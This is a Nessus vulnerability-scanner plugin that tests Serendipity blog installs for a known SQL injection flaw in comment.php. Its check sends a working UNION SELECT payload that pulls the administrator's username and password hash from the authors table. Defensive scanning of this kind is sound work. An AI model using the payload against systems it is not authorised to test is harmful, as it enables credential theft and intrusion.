#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(14842);
 script_version ("$Revision: 1.22 $");

 script_cve_id("CVE-2004-2157", "CVE-2004-2158");
 script_bugtraq_id(11269);
 script_osvdb_id(10370, 10371, 19127);

 script_name(english:"Serendipity < 0.7.0beta3 Multiple Vulnerabilities");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains PHP scripts that are prone to SQL
injection and a cross-site scripting attack." );
 script_set_attribute(attribute:"description", value:
"The remote version of Serendipity is vulnerable to SQL injection
issues due to a failure of the application to properly sanitize user-
supplied input.

An attacker may exploit this flaw to issue arbitrary statements in the
remote database, and therefore, bypass authorization or even overwrite
arbitrary files on the remote system

In addition, the comment.php script is vulnerable to a cross-site
scripting attack." );
  # http://lists.grok.org.uk/pipermail/full-disclosure/2004-September/026955.html
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?face78e6" );
 script_set_attribute(attribute:"see_also", value:"http://www.s9y.org/5.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Serendipity 0.7.0beta3 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2004/09/28");
 script_set_attribute(attribute:"vuln_publication_date", value: "2004/09/28");
 script_cvs_date("$Date: 2015/11/18 21:03:58 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:s9y:serendipity");
script_end_attributes();


 script_summary(english:"Checks for SQL injection vulnerability in Serendipity");

 script_category(ACT_ATTACK);

 script_copyright(english:"This script is Copyright (C) 2004-2015 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");

 script_dependencies("serendipity_detect.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_ports("Services/www", 80);
 script_require_keys("www/serendipity");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/serendipity"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
 loc = matches[2];
 w = http_send_recv3(method:"GET", item:string(loc, "/comment.php?serendipity[type]=trackbacks&serendipity[entry_id]=0%20and%200%20union%20select%201,2,3,4,username,password,7,8,9,0,1,2,3%20from%20serendipity_authors%20where%20authorid=1%20--"), port:port);
 if (isnull(w)) exit(1, "The web server did not answer");
 r = w[2];

 if( 
  "Weblog" >< r &&
  egrep(pattern:"<b>Weblog: </b> [a-f0-9]*<br />", string:r) &&
  "0 and 0 union select 1,2,3,4,username,password,7,8,9,0,1,2,3 from serendipity_authors where authorid=1" >< r
 ) {
     security_hole(port);
     set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
   }
}
